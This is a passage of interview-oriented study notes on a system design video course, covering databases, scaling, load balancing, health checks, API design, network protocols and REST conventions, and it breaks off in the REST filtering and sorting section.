# System Design Course — Interview-Ready Notes

> Source: freeCodeCamp — *System Design Course – APIs, Databases, Caching, CDNs, Load Balancing & Production Infra*
> Author: Hayk Simonyan · Video: `C842vFY5kRo` · Runtime ≈ 2h 05m
>
> **What the video actually covers** (despite the title): Foundations → Scaling → Load Balancing → API Design → API Protocols → TCP/UDP → REST → GraphQL → AuthN → AuthZ → API Security.
> The remaining roadmap modules — **databases at scale, caching, CDNs, big data, production infra, interview technique** — are *announced in this video* but deferred to the author's own channel. They're written up in full in **[PART II](#part-ii--the-rest-of-the-roadmap)**.
>
> **Dedicated deep dives in this repo:** [networking.md](networking.md) · [databases.md](databases.md) · [caching.md](caching.md) · [load-balancer.md](load-balancer.md) · [rest-api.md](rest-api.md) · [distributed-systems.md](distributed-systems.md) · [system-design-interview-playbook.md](system-design-interview-playbook.md) · [README.md](README.md)

---

## Table of Contents

| # | Topic | Timestamp |
|---|-------|-----------|
| 0 | [Why this matters](#0-why-this-matters-mid-level--senior) | 0:00:00 |
| 1 | [Single Server Setup](#1-single-server-setup) | 0:03:05 |
| 2 | [Databases: SQL, NoSQL, Graph](#2-databases--sql-nosql-graph) | 0:07:12 |
| 3 | [Vertical vs Horizontal Scaling](#3-vertical-vs-horizontal-scaling) | 0:13:32 |
| 4 | [Load Balancing](#4-load-balancing) | 0:16:22 |
| 5 | [Health Checks](#5-health-checks) | 0:25:08 |
| 6 | [Single Point of Failure (SPOF)](#6-single-point-of-failure-spof) | 0:28:00 |
| 7 | [API Design](#7-api-design) | 0:31:01 |
| 8 | [API Protocols](#8-api-protocols) | 0:47:17 |
| 9 | [Transport Layer: TCP & UDP](#9-transport-layer--tcp--udp) | 0:59:10 |
| 10 | [RESTful APIs](#10-restful-apis) | 1:04:22 |
| 11 | [GraphQL](#11-graphql) | 1:19:04 |
| 12 | [Authentication](#12-authentication) | 1:24:52 |
| 13 | [Authorization](#13-authorization) | 1:45:51 |
| 14 | [API Security — 7 Techniques](#14-api-security--7-techniques) | 1:57:02 |
| — | **[PART II — The Rest of the Roadmap](#part-ii--the-rest-of-the-roadmap)** | *announced at 1:58* |
| 15 | [Databases Part 2 — Replication, Sharding, CAP](#15-databases-part-2--scaling-the-data-tier) | module 3 |
| 16 | [Caching](#16-caching) | module 4 |
| 17 | [CDN](#17-cdn--content-delivery-network) | module 4 |
| 18 | [Big Data Processing](#18-big-data-processing) | module 5 |
| 19 | [Designing for Production](#19-designing-for-production) | module 6 |
| 20 | [The System Design Interview](#20-the-system-design-interview--a-repeatable-framework) | module 7 |
| — | [Rapid-Fire Cheat Sheet](#rapid-fire-interview-cheat-sheet) | — |

---

# PART I — What the Video Records

## 0. Why This Matters (Mid-level → Senior)

The core thesis of the course:

- Mid-level devs **add to** an existing architecture with clear requirements on a mature system.
- Seniors **design from scratch** with *rough, ambiguous* requirements and defend the trade-offs.
- Companies pay six figures for **architectural decisions**, not for typing code.

**Interview translation:** In a system design round, you are graded on
1. Requirement clarification (functional + non-functional),
2. Trade-off reasoning ("I chose X over Y *because*…"),
3. Evolution (start simple → identify the bottleneck → scale that piece),
4. Communication.

Never jump straight to "I'll use Kafka + Cassandra + Kubernetes." Start with one box, then break it.

---

## 1. Single Server Setup

**Idea:** every complex system starts simple. Design for 1 user, then grow. This is also the *exact* narrative structure interviewers want.

### The monolith box

Everything on one machine: web app + database + cache + static files, on a single IP.

```
┌──────────┐        ┌─────┐        ┌───────────────────────────┐
│ Browser  │──(1)──►│ DNS │──(2)──►│  Server  15.125.23.214    │
│ Mobile   │        └─────┘        │  ┌──────┬──────┬───────┐  │
└────┬─────┘                       │  │ Web  │ App  │  DB   │  │
     │                             │  └──────┴──────┴───────┘  │
     └────────(3) HTTP request────►│       + cache + files     │
     ◄────────(4) HTML / JSON──────└───────────────────────────┘
```

### Request flow (say this out loud in an interview)

1. User types `app.demo.com`. The client has a **domain**, not an IP.
2. Browser asks **DNS** (Domain Name System) — the phonebook that maps domain → IP.
3. DNS returns `15.125.23.214`.
4. Client sends an **HTTP request** straight to that IP.
5. Server processes and responds:
   - **Web browser** → HTML/CSS/JS (server handles business logic, storage *and* presentation).
   - **Mobile app** → **JSON** over HTTP (lightweight, trivially parsed on device).

### Two traffic sources

| Source | Payload | Notes |
|---|---|---|
| Web app | HTML/CSS/JS (server-rendered) | Server owns presentation |
| Mobile app | JSON via API calls | Server is a pure data API |

Example contract:

```http
GET /products/12345
```
```json
{
  "id": "12345",
  "name": "Wireless Headphones",
  "description": "Noise-cancelling over-ear",
  "price": 199.99,
  "currency": "USD",
  "inStock": true
}
```

### Why this breaks

| Problem | Consequence |
|---|---|
| One machine = one **SPOF** | Server dies → 100% outage |
| Web + DB compete for CPU/RAM/disk | A heavy query starves HTTP threads |
| Can't scale tiers independently | DB needs RAM, web needs CPU — you must overpay for both |
| No geographic distribution | Users far away eat full RTT |

**Takeaway:** Understand the request lifecycle end-to-end (DNS → HTTP → server → response). Every later optimisation is "insert a component into this path."

---

## 2. Databases — SQL, NoSQL, Graph

**First split: web tier ↔ data tier.** Move the database onto its own server so each tier scales on its own axis.

```
Clients ──► Web/App Tier (stateless, CPU-bound) ──► Data Tier (stateful, RAM/IO-bound)
```

### 2.1 Relational (RDBMS / SQL)

- Query language: **SQL** (Structured Query Language).
- Data lives in **tables** (like spreadsheets): **columns** = fields/attributes, **rows** = records.
- Examples: **PostgreSQL, MySQL, Oracle, SQLite**, SQL Server.

```
customers
┌─────┬───────┬─────┬───────────────────┐
│ id  │ name  │ age │ email             │
├─────┼───────┼─────┼───────────────────┤
│ 123 │ John  │ 40  │ john@example.com  │
└─────┴───────┴─────┴───────────────────┘
```

**Advantage 1 — JOINs.** Combine `customers` + `products` into `orders`, linking by `customer_id` / `product_id`. Data is stored **once, normalised**; relationships are derived at query time.

**Advantage 2 — ACID transactions.** A transaction = a sequence of SQL operations treated as one atomic unit. Classic example: a bank transfer (debit A, credit B).

| Letter | Meaning | Plain English |
|---|---|---|
| **A**tomicity | All-or-nothing | Either both legs of the transfer commit, or neither does |
| **C**onsistency | Valid state → valid state | Constraints/invariants (e.g. no negative balance) always hold |
| **I**solation | Concurrent txns don't interfere | Your transfer doesn't see someone else's half-finished write |
| **D**urability | Survives crashes | Once committed, it's on disk even if the server dies |

> Interview add-on: know the isolation levels — Read Uncommitted → Read Committed → Repeatable Read → Serializable, and the anomalies each prevents (dirty read, non-repeatable read, phantom read).

### 2.2 Non-relational (NoSQL) — four families

| Type | Model | Examples | Superpower |
|---|---|---|---|
| **Document store** | JSON-like documents; complex nested structures in one record | **MongoDB**, CouchDB | Flexible schema, whole aggregate in one read |
| **Wide-column store** | Tables, rows, **dynamic columns** | **Cassandra**, Cosmos DB, HBase | Massive scale, extremely **write-heavy** workloads |
| **Graph store** | Entities + **relationships** as first-class graph | **Neo4j**, Amazon **Neptune** | Traversals: recommendations, social graphs, fraud rings |
| **Key–value store** | `key → value`, primarily **in RAM** | **Redis**, **Memcached**, DynamoDB | Raw simplicity + speed (sub-ms reads/writes) |

Concrete callout from the video: **Amazon uses Neptune (graph DB)** to power product recommendations based on your order history.

**NoSQL advantage — denormalised aggregates.** The same customer/product/order model in MongoDB can be a *single document*:

```json
{
  "_id": "u_123",
  "name": "John",
  "orders": [
    { "orderId": "o_1", "products": [ { "id": "p_9", "name": "Headphones", "price": 199.99 } ] }
  ]
}
```
→ No JOIN, one round trip, low latency, easy to shard.

### 2.3 Choosing: SQL vs NoSQL

| Choose **SQL** when… | Choose **NoSQL** when… |
|---|---|
| Data is well-structured with **clear relationships** (e-commerce: customers ↔ orders) | You need **ultra-low latency** reads/writes |
| You need **strong consistency + transactional integrity** (banking, payments, ledgers) | Data is **unstructured / semi-structured** (JSON blobs) and relationships aren't crucial |
| Complex ad-hoc querying, reporting, analytics | You need **flexible, horizontally scalable** storage for massive volumes |
| Schema is stable | Schema evolves fast; fields differ per record |
| | Recommendation engines / activity streams stored as key-value |

**Say this in an interview:** "SQL for correctness and relationships; NoSQL for scale and flexibility. Most real systems are **polyglot** — Postgres for the transactional core, Redis for sessions/cache, Elasticsearch for search, Cassandra for the event firehose."

> **CAP theorem (not in the video, always asked):** in a network **P**artition you must choose **C**onsistency or **A**vailability. RDBMS/single-leader ≈ CP. Cassandra/DynamoDB (tunable) ≈ AP. Also know **BASE** (Basically Available, Soft state, Eventually consistent) as NoSQL's counterpart to ACID.

---

## 3. Vertical vs Horizontal Scaling

### 3.1 Vertical scaling ("scale up")

Add more resources to the **same** server: more RAM, more CPU, faster disk.

✅ **Pros:** dead simple — no code changes, no distributed-systems problems. Fine for low/moderate traffic.

❌ **Cons (the two the video hammers):**
1. **Hard resource limit** — there is a physical ceiling; you eventually cannot buy a bigger box.
2. **No redundancy** — still one server. It dies → the whole app dies. (SPOF)

### 3.2 Horizontal scaling ("scale out")

Add **more servers** and share the load across them.

✅ **Pros:**
1. **Fault tolerance** — 1 of 3 dies, the other 2 keep serving while it recovers.
2. **Scalability** — need more capacity? Add a 4th, 5th, *n*th server. Effectively unbounded.

❌ **Cons:** you now need a **load balancer**, statelessness, session handling, data consistency, and distributed debugging.

| | Vertical | Horizontal |
|---|---|---|
| Method | Bigger machine | More machines |
| Ceiling | Hard physical cap | Practically unlimited |
| Redundancy | None | Built-in |
| Complexity | Low | High (LB, state, consistency) |
| Downtime to scale | Usually yes (reboot) | No |
| Cost curve | Super-linear (big boxes cost a premium) | Roughly linear (commodity hardware) |
| Best for | Small/moderate traffic, **databases** (writes) | Large-scale apps, **stateless web/app tier** |

### 3.3 The problem horizontal scaling creates

With 1 server, all requests obviously go there. With 3 servers — **where does a request go?** You need something in the middle. That something is the **load balancer**.

> **Golden rule for interviews:** *Keep the app tier stateless.* Store session/state in Redis or in the token, never in server memory — otherwise horizontal scaling breaks (user hits server 2 and loses their session).

---

## 4. Load Balancing

A load balancer sits between clients and the server pool, distributing incoming traffic so **no single server bears too much load**.

Its three jobs:
1. **Distribute traffic** (per an algorithm),
2. **Fault tolerance** — stop routing to dead servers,
3. **Enable scalability** — new servers join the pool transparently.

### 4.1 The 7 load-balancing algorithms

#### 1️⃣ Round Robin
Each server gets a request in **sequential rotating order**: 1 → 2 → 3 → 1 → 2 → 3…
- Simplest form of LB.
- ✅ Works well when **all servers have similar specs**.
- ❌ Ignores actual load; a server stuck on a slow request still gets its turn.

#### 2️⃣ Least Connections
Send the request to the server with the **fewest active connections**.
- Example: S1=10, S2=9, S3=40 → next request goes to **S2**.
- ✅ Great for **variable-length sessions** (one lasts 10 min, another 1 min).
- ❌ Connection count ≠ actual CPU cost.

#### 3️⃣ Least Response Time
Picks the server with the **lowest response time AND fewest active connections**.
- Example: S1 = high responsiveness, S3 = medium, S2 = low. Traffic floods S1 until it hits ~40 active connections, then spills to S3 (~20), then S2 (~10), then cycles back.
- ✅ Best when you need the **fastest response** and servers have **heterogeneous capabilities**.

#### 4️⃣ IP Hash
`server = hash(client_IP) % N`. Same client → **same server, every time**.
- ✅ Gives you **session affinity / sticky sessions** for free — essential if each server holds local state about its connected clients.
- ❌ Uneven distribution (NAT'd corporate IPs), and **adding/removing a server remaps almost everyone** (because `% N` changes).

#### 5️⃣ Weighted algorithms (Weighted Round Robin / Weighted Least Connections)
Servers get **weights** based on capacity/performance metrics.
- Example: S1=16 GB RAM, S2=32 GB, S3=64 GB → S3 gets the largest share, then S2, then S1.
- ✅ The right answer for a **heterogeneous fleet** (mixed instance types).

#### 6️⃣ Geographic / GeoDNS
Route to the server **geographically closest** to the user, determined from their IP.
- Example: pool = `us-east`, `us-west`, `eu-west`. EU user → EU server; US user → nearest US region.
- ✅ For **global services where latency reduction matters**.
- ❌ Needs data replication per region + raises data-residency (GDPR) questions.

#### 7️⃣ Consistent Hashing
A hash function maps both **servers** and **clients** onto a circular **hash ring**. A request is served by the **first server clockwise** from the client's position.

```
              ┌─── S1 ───┐
         hash │           │
        ring  ●  ← client │   client hashes onto the ring;
              │           │   goes to nearest server (S2)
              └─── S2 ── S3
```
- ✅ Gives sticky routing **and** — the killer feature — when a server is added/removed, **only ~1/N of the keys remap**, not all of them (unlike plain `% N` hashing).
- ✅ This is why it's the backbone of **distributed caches (Memcached/Redis clusters), Cassandra, DynamoDB, and CDNs**.
- ❌ More complex; needs **virtual nodes** to avoid hot spots.

> ⭐ Consistent hashing is the single most-asked LB question. Be ready to explain "rehashing storm" — with `hash % N`, adding one cache node invalidates nearly the entire cache and stampedes your DB.

### 4.2 Load balancer implementations

| Category | Examples | Notes |
|---|---|---|
| **Software** | **Nginx** (also a web server; you install it, configure upstreams + algorithm + health checks), **HAProxy** (open source) | Cheap, flexible, you own the ops |
| **Hardware** | **F5 BIG-IP**, **Citrix ADC (NetScaler)** | Very high performance, rich feature set, expensive appliances |
| **Cloud / managed** | **AWS Elastic Load Balancing (ELB/ALB/NLB)**, **Azure Load Balancer**, **Google Cloud Load Balancing** | Comes with security, **auto-scaling** (adds servers when demand rises), and **monitoring/health checks** built in — zero setup |

Minimal Nginx shape:

```nginx
upstream app_servers {
    least_conn;                     # or: ip_hash; / hash $request_uri consistent;
    server 10.0.1.11:8080 weight=3;
    server 10.0.1.12:8080 weight=2;
    server 10.0.1.13:8080 weight=1;
}

server {
    listen 80;
    location / {
        proxy_pass http://app_servers;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

> **L4 vs L7 (not in video, commonly asked):**
> - **L4 (transport)** — routes on IP + port, no payload inspection. Blazing fast. AWS **NLB**.
> - **L7 (application)** — reads HTTP: path, headers, cookies. Enables path-based routing (`/api` → service A), TLS termination, header rewriting. AWS **ALB**, Nginx.

---

## 5. Health Checks

**The question:** the LB stops routing to a dead server — but *how does it know* the server is dead?

**Answer:** the LB continuously sends **health check requests** to every server in the pool and maintains an online/offline registry.

```
LB ──► GET /health ──► S1  200 OK   ✅ online
LB ──► GET /health ──► S2  200 OK   ✅ online
LB ──► GET /health ──► S3  200 OK   ✅ online
LB ──► GET /health ──► S4  timeout  ❌ offline  → removed from rotation
```

- On failure → the server is pulled from rotation; **no new traffic** is sent to it.
- The LB keeps probing. When health checks **succeed again**, the server is put **back into rotation** automatically.
- Nginx, HAProxy, and all cloud LBs ship with this. AWS ELB's "monitoring" *is* health checking.

> **Interview depth (beyond the video):**
> - **Liveness** ("is the process alive? if not, restart me") vs **Readiness** ("am I ready to receive traffic? e.g. DB pool warm, migrations done").
> - **Shallow** check (`return 200`) vs **deep** check (ping DB + cache + downstream). Deep checks are more accurate but can cause **cascading failure** — one slow DB marks the *whole fleet* unhealthy and takes you down.
> - Tune **interval**, **timeout**, **unhealthy threshold** (N consecutive failures) and **healthy threshold** to avoid flapping.
> - Pair with **connection draining / graceful shutdown** so in-flight requests finish before a node is removed.

---

## 6. Single Point of Failure (SPOF)

**Definition:** any component that, when it stops working, brings the **entire system** down with it.

```
Clients ──► [ Load Balancer ] ──► API 1 ┐
                  ▲                API 2 ├──► [ Single Database ]  ⚠️ SPOF
                  ⚠️ SPOF          API 3 ┘
```
Even with three API servers, one database means: DB dies → every API fails → every client gets errors.

### Why SPOFs are dangerous — three angles

1. **Reliability** — one failure takes the entire system down → direct **business loss** (users can't reach checkout, can't transact).
2. **Scalability** — systems with SPOFs **struggle to scale**; every new component funnelling through that choke point adds risk and contention.
3. **Security** — a SPOF is a **target**. Flood the single load balancer with traffic (DoS) and the whole system falls over.

### Eliminating the load balancer as a SPOF — 3 strategies

**1️⃣ Redundancy (active–active / active–passive)**
Run **more than one load balancer**. Normally traffic is split (e.g. 50/50). If LB2 dies, **all** traffic shifts to LB1, which keeps balancing across the app servers. When LB2 recovers, it's given its 50% back.

**2️⃣ Health checks & monitoring *for the load balancers themselves***
Exactly the same idea as §5, one level up. Continuously monitor LB health; when an LB goes down, stop routing to it until it's back online. (In practice: DNS failover / floating VIP / BGP anycast / VRRP + Keepalived.)

**3️⃣ Self-healing systems**
Monitor the LB; the moment it's detected as down, **automatically replace it** with a fresh instance of the same LB. No manual intervention, no interruption — clients connect to the new instance. (In practice: AWS Auto Scaling Group with `min=max=N`, or a Kubernetes Deployment.)

### General SPOF removal checklist

| Layer | SPOF | Fix |
|---|---|---|
| DNS | Single DNS provider | Multiple providers / Anycast |
| LB | One LB | Redundant LB pair + floating IP / DNS failover |
| App tier | One server | Horizontal scaling + stateless design |
| Database | One primary | **Replication** (primary–replica), automatic failover, multi-AZ |
| Cache | One node | Redis Cluster / Sentinel |
| Region | One AZ/region | Multi-AZ → multi-region active-active |
| Data | One copy | Backups + point-in-time recovery |

> **N+1 redundancy** is the vocabulary term: always provision one more instance than you need to serve peak load.

---

## 7. API Design

### 7.1 What is an API?

**API = Application Programming Interface** — the **contract** that defines how software components interact.

It specifies:
- **What requests can be made** (endpoints, methods, parameters),
- **What responses can be expected** (shape, status codes, errors).

Two structural properties:

1. **Abstraction mechanism** — hides implementation, exposes functionality. You call "save user" without knowing (or caring) whether it writes to Postgres, publishes to Kafka, or emails a monkey.
2. **Service boundary definition** — draws clear interfaces between systems/components. This is what lets you have a Users service, a Posts service, etc., and lets *anything* talk to *anything* (browser↔server, server↔server) regardless of internal implementation.

### 7.2 The three dominant API styles

> 📎 **Deep dive:** [restvsgraphqlVsRPC.md](restvsgraphqlVsRPC.md) — GraphQL schema/resolvers, RPC stubs & IDL, and the production trade-offs of each.

| | **REST** | **GraphQL** | **gRPC** |
|---|---|---|---|
| Full name | REpresentational State Transfer | Graph Query Language | Google Remote Procedure Call |
| Paradigm | **Resource-based**, HTTP methods | **Query language**, client specifies shape | **RPC framework**, call remote functions |
| Endpoints | Many (`/users`, `/posts`) | **One** (`/graphql`) | Service methods in `.proto` |
| Transport | HTTP/1.1 or 2 | HTTP | **HTTP/2** |
| Payload | JSON | JSON | **Protocol Buffers** (binary) |
| Operations | GET / POST / PUT / PATCH / DELETE | **query** (read) / **mutation** (write) / **subscription** (real-time) | RPCs (unary + streaming, **bidirectional**) |
| Statelessness | **Stateless** — every request carries everything needed | Stateless | Stateless |
| Best for | **Web & mobile apps**, public APIs | **Complex UIs** with varied/nested data needs | **Microservices**, internal server↔server |
| Popularity | #1 most common | #2 | #3 (least common of the three) |

**Key one-liners:**
- REST: "each request contains all the information needed to process it — no prior request required."
- GraphQL: "**minimal round trips** — what takes 3 REST calls takes 1 GraphQL call."
- gRPC: "high-performance; more efficient than REST/GraphQL when servers talk to servers."

### 7.3 The 4 pillars of great API design

> 🏆 **The golden rule stated twice in the course: "The best API is the one you can use *without reading the documentation*."**

**1️⃣ Consistency**
Consistent naming, casing, and patterns. Don't mix `userDetails` (camelCase) in one endpoint and `user_details` (snake_case) in another. Pick one and never deviate.

**2️⃣ Simplicity**
Focus on core use cases; intuitive design; minimise complexity. A developer should understand it quickly without docs.
*Anti-pattern from the video:* `GET /users/123` that **also silently updates followers**. GET must not have surprising side effects.

**3️⃣ Security**
Non-negotiable baseline:
- Authentication & authorization
- **Input validation**
- **Rate limiting**

**4️⃣ Performance**
- Appropriate **caching** strategies
- **Pagination** — never return 1,000 posts because someone hit `GET /posts`; always `limit` + `offset`/`page`
- **Minimise payloads** — send only what's needed
- **Reduce round trips** — if you know a client will need a small related field, embed it rather than forcing a second call

### 7.4 Protocol choice shapes API design

Your protocol choice **fundamentally constrains** your API options:

| Protocol | Enables | Natural fit |
|---|---|---|
| **HTTP** | Status codes, verbs, caching headers | **REST** (verbs map perfectly to CRUD) and **GraphQL** |
| **WebSocket** | Real-time, **bidirectional** push | Chat, live video/streaming, collaborative editing, live dashboards |
| **gRPC (HTTP/2)** | Binary, multiplexed, streaming | **Microservice-to-microservice** — faster than HTTP/JSON |

### 7.5 The API design process

**Step 1 — Understand requirements**
- Identify **core use cases and user stories**
- Define **scope and boundaries** (what you're *not* building now)
- Determine **performance requirements** — where are the bottlenecks?
- Don't overlook **security constraints** (authN, authZ, rate limiting, + whatever the domain demands)

**Step 2 — Pick a design approach**

| Approach | What it means | When used |
|---|---|---|
| **Top-down** | Start from high-level requirements & workflows → derive endpoints | **Common in interviews** — you're handed requirements |
| **Bottom-up** | Start from **existing data models & capabilities** → expose them | Common **on the job** at a company with a legacy data layer |
| **Contract-first** | Define request/response contract **before** any implementation | Similar to top-down; **also common in interviews**; enables parallel FE/BE work + mock servers (OpenAPI/Swagger) |

**Step 3 — Lifecycle management**

```
Design ──► Development (+ local testing) ──► Deploy & Monitor (staging → prod)
   ──► Maintenance ──► Deprecation ──► Retirement
```

- **Design**: agree on requirements and expected outcomes *before* coding.
- **Development**: implement + local tests.
- **Deploy & monitor**: further testing on staging/production, observability.
- **Maintenance**: this is *why* simplicity matters — you or someone else must maintain it.
- **Deprecation & retirement**: v1 gets deprecated when v2 lands. Publish timelines, add `Deprecation`/`Sunset` headers, then retire.

> **"API development is not just coding."** Design + maintainability + eventual retirement are the majority of the lifetime cost.

---

## 8. API Protocols

**Why it matters:** the wrong protocol → performance bottlenecks and functional limitations. Protocol choice must be driven by latency, throughput, and **interaction pattern** requirements.

### 8.1 Where application protocols sit

```
┌──────────────────────────────────────────────┐
│ APPLICATION LAYER   HTTP · HTTPS · WebSocket │  ← you build APIs here
│                     AMQP · gRPC · FTP · SMTP │
├──────────────────────────────────────────────┤
│ TRANSPORT LAYER     TCP · UDP                │  ← §9
├──────────────────────────────────────────────┤
│ NETWORK LAYER       IP                       │
├──────────────────────────────────────────────┤
│ DATA LINK / PHYSICAL                         │
└──────────────────────────────────────────────┘
```
Application-layer protocols define: **message formats & structure**, **request–response patterns**, **connection management**, and **error handling**. When building APIs, these top two layers are all you need.

### 8.2 HTTP — HyperText Transfer Protocol

The foundation of web APIs. Classic request/response cycle:

**Request**
```http
GET /api/products/123 HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGciOi...
Accept: application/json
```
- **Method** (`GET`/`POST`/…), **resource URL**, **HTTP version**
- **Host** — the domain of the server
- **Authorization** — bearer token, basic auth, OAuth, etc. (you usually authenticate before accessing resources)

**Response**
```http
HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: max-age=3600

{ "id": "123", "name": "Wireless Headphones" }
```
- Same **HTTP version**, a **status code**, **Content-Type** (usually `application/json`, but could be HTML/static), plus other headers like `Cache-Control`.

**Methods**

| Method | Purpose |
|---|---|
| `GET` | Retrieve data |
| `POST` | Create data on the server |
| `PUT` / `PATCH` | Update fully / partially |
| `DELETE` | Remove data |

**Status code families**

| Range | Meaning |
|---|---|
| **2xx** | Success |
| **3xx** | Redirection |
| **4xx** | **Client** error — the caller made a bad request |
| **5xx** | **Server** error — something broke on our side |

**Common headers:** `Content-Type`, `Authorization`, `Accept`, `Cache-Control`, `User-Agent`.

### 8.3 HTTPS

HTTP **+ TLS/SSL encryption**. Same protocol, security layer added via certificates.

**Benefits:** data **encrypted in transit** · **data integrity** (tamper detection) · **server authentication** (you're really talking to the site you think) · **SEO benefits**.

> **The golden standard is to always use HTTPS.** Plain HTTP is a risk in every production context.

### 8.4 WebSockets — real-time, bidirectional

**The problem with HTTP polling.** Chat app: to know if there are new messages, the client must keep asking.

```
Client → "any new messages?" → Server → [] (empty)      ← wasted round trip
Client → "any new messages?" → Server → [msg1]
Client → "any new messages?" → Server → [] (empty)      ← wasted round trip
```
Costs: **increased latency** (you learn about a message up to one poll-interval late), **wasted bandwidth** (empty responses), **wasted server resources** (needless requests).

**The WebSocket solution.**
1. Client opens with an HTTP **handshake** (`Upgrade: websocket`).
2. The connection becomes a **persistent, full-duplex channel**.
3. **The server can now push data to the client on its own initiative** — the moment 2 new messages arrive, they're sent. The client can still send whenever it wants.

```
Client ⇄ handshake ⇄ Server
Client ⇄═══ persistent bidirectional channel ═══⇄ Server
                ← server pushes msg1 (unprompted)
                → client sends msg2
```

**Benefits:** real-time data with **minimal latency** · **reduced bandwidth** (no polling) · true bidirectional communication.
**Use for:** chat, live notifications, multiplayer, collaborative editing, live dashboards, video/streaming control channels.

### 8.5 AMQP — Advanced Message Queuing Protocol

An **enterprise messaging protocol** for **message queuing with guaranteed delivery** — i.e. **asynchronous** communication.

```
┌──────────┐   publish   ┌───────── Message Broker ─────────┐   pull   ┌──────────┐
│ Producer │────────────►│  [ order.processing queue ]      │◄─────────│ Consumer │
│ (web svc,│             │  [ notifications queue     ]      │          │(inventory│
│ payments)│             │  [ email queue             ]      │          │ updater) │
└──────────┘             └───────────────────────────────────┘          └──────────┘
```

**Flow:** producer publishes a message to a queue → the message **waits** → the consumer **pulls it only when it has capacity** → processes it (e.g. update inventory in the DB). If the consumer is busy, the message stays safely in the queue.

**Why this is powerful:**
- **Decoupling** — producer doesn't know or care who consumes.
- **Load levelling / back-pressure** — traffic spikes fill the queue instead of crushing the consumer.
- **Reliability** — messages persist; a consumer crash doesn't lose work.
- **Retries** — failed messages can be redelivered (→ dead-letter queues).

**Exchange types:** **direct** (1-to-1 routing) · **fanout** (broadcast to all bound queues) · **topic** (pattern-based routing, e.g. `order.*.eu`).

Implementations: **RabbitMQ** (the canonical AMQP broker), ActiveMQ. (Kafka is a log, not AMQP, but fills a similar architectural slot.)

### 8.6 gRPC

- **High-performance RPC framework invented by Google.**
- Uses **HTTP/2** for transport → multiplexing, header compression, **built-in streaming**.
- Serialises with **Protocol Buffers** (binary, schema-defined in `.proto` files) — much smaller and faster to parse than JSON.
- Methods are declared as **RPCs** in the `.proto`; codegen produces client + server stubs.
- Supports **streaming and bidirectional** communication.

```protobuf
service ProductService {
  rpc GetProduct (GetProductRequest) returns (Product);
  rpc StreamPrices (PriceRequest) returns (stream PriceUpdate);
}
```

**The catch:** the client must support HTTP/2. **Browsers don't expose the required HTTP/2 primitives**, which is why gRPC is uncommon for browser↔server and dominant for **server↔server microservices**. (Workaround: gRPC-Web + a proxy.)

### 8.7 How to choose a protocol

| Criterion | Question |
|---|---|
| **Interaction pattern** | Simple request/response → **HTTP** (the default). Real-time/bidirectional → **WebSocket**. Fire-and-forget/async → **AMQP**. |
| **Performance requirements** | Microservices needing max throughput/low latency → **gRPC**. |
| **Client compatibility** | Browsers don't support what gRPC needs → don't use gRPC browser-facing. |
| **Payload size & encoding** | Large/high-volume binary data → protobuf (gRPC) over JSON. |
| **Security needs** | Authentication, encryption requirements. |
| **Developer experience** | Tooling, documentation, ecosystem maturity — you'll live in this API daily. |

---

## 9. Transport Layer — TCP & UDP

Most developers use APIs without ever asking *what actually delivers the packets*. That's the **transport layer**, which sits **below** the application layer and moves data between machines.

### 9.1 TCP — Transmission Control Protocol

> Mental model: **sending a parcel with a receipt, tracking, and signature required.**

Data larger than one packet is split into chunks. TCP guarantees:

1. **Guaranteed delivery** — if a packet is lost, TCP **resends** it (after a timeout).
2. **Connection-based** — a **three-way handshake** establishes the connection *before* any data flows.
3. **Ordering** — packets arriving as 1, 3, 2 are **reordered** to 1, 2, 3 before delivery to the app.

**Three-way handshake**

```
Client ──────── SYN ────────► Server      (1) client requests a connection
Client ◄────── SYN-ACK ─────  Server      (2) server acknowledges + syncs
Client ──────── ACK ────────► Server      (3) client acknowledges
              ✅ CONNECTION ESTABLISHED — data can now flow
```

**Cost:** overhead (handshake latency, ACKs, retransmissions, congestion control). **Benefit:** accuracy and reliability.

**Use TCP for:** payments, authentication, user data, banking, email, file transfer, HTTP/HTTPS, database connections — **anything where a lost byte is unacceptable.**

### 9.2 UDP — User Datagram Protocol

> Mental model: **dropping a postcard in the mailbox.** Fast, cheap, no receipt.

- **No delivery guarantee.** Send 4 packets, one is lost → it's simply gone. UDP never resends.
- **No handshake, no connection, no tracking.**
- In exchange: **faster transmission** and **less overhead**.

**Why lossiness is *fine* for some workloads:** in a video call, if your friend's connection lags and a fragment of audio is lost, you **don't want it re-sent** — that data is stale and useless by the time it arrives. Better to skip it and keep going with the live stream.

**Use UDP for:** video calls, live streaming, online gaming, VoIP, DNS lookups, telemetry/metrics.

### 9.3 Side-by-side

| | **TCP** | **UDP** |
|---|---|---|
| Reliability | ✅ Guaranteed delivery + retransmit | ❌ Best-effort, packets can vanish |
| Connection | Connection-oriented (3-way handshake) | Connectionless |
| Ordering | ✅ Reordered for you | ❌ Arrive in any order |
| Speed | Slower | **Faster** |
| Overhead | Higher (20-byte header, ACKs, congestion control) | Lower (8-byte header) |
| Use when | Safety & reliability matter | Speed matters, **some loss is acceptable** |
| Examples | Banking, emails, payments, HTTP(S) | Video streaming, gaming, VoIP, DNS |

**Decision rule:** *Reliable and safe → TCP. Fast and lightweight with tolerable loss → UDP.*

> **Interview add-on:** **HTTP/3 / QUIC** runs over **UDP** and re-implements reliability + ordering in userspace, eliminating TCP head-of-line blocking and cutting connection setup to 0–1 RTT. Great "do you keep up?" answer.

---

## 10. RESTful APIs

REST lets parts of a system talk using **standard HTTP methods**. It is by far the most common style. The goal of good design: avoid **messy, inconsistent patterns** that make APIs hard to use and maintain.

### 10.1 Resource modelling — nouns, not verbs

Map your **business domain** to **resources**, and name them as **plural nouns**.

| Business concept | Resource |
|---|---|
| Product | `/products` |
| Order | `/orders` |
| Review | `/reviews` |

**Collections vs individual items**

```http
GET /api/v1/products          → collection (list of products)
GET /api/v1/products/123      → individual item (one product)
```

**Nested resources** express containment naturally:
```http
GET /api/v1/products/123/reviews    → reviews for product 123
```

❌ **Wrong:** `/getProducts`, `/getAllProducts`, `/deleteUser`, `/product` (singular)
✅ **Right:** `/products` + the right HTTP verb

> The **verb lives in the HTTP method**, never in the URL. `GET /orders` reads, `POST /orders` creates — same URL.

### 10.2 Filtering, sorting, pagination

You rarely want to return everything at once. All three are done via **query parameters** (everything after the `?`).

**Filtering**
```http
GET /api/v1/products?category=electronics&inStock=true
```
Return only what the UI will display — don't waste bandwidth or bloat the client response.

**Sorting**
```http
GET /api/v1/products?sort=price_asc
GET /api/v1/products?sort=-rating          # descending
```
